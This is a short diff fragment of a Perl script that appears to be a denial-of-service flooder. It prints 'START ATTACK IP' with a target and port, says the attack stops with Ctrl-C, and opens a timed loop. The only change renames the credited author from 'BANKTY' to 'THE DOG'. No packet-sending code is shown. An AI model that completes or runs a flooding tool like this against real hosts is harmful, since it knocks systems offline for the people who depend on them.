@@ -37,7 +37,7 @@ print  "START ATTACK IP $ip
 START ATTACK port " . ($port ? $port : "random"). " \n";
 
 print " \n";
-print  "ATTACK DONE BY:BANKTY...\n";
+print  "ATTACK DONE BY:THE DOG...\n";
 print "Attaque arrêtée avec Ctrl-C\n" unless $time;
  
 for (;time() <= $endtime;) {
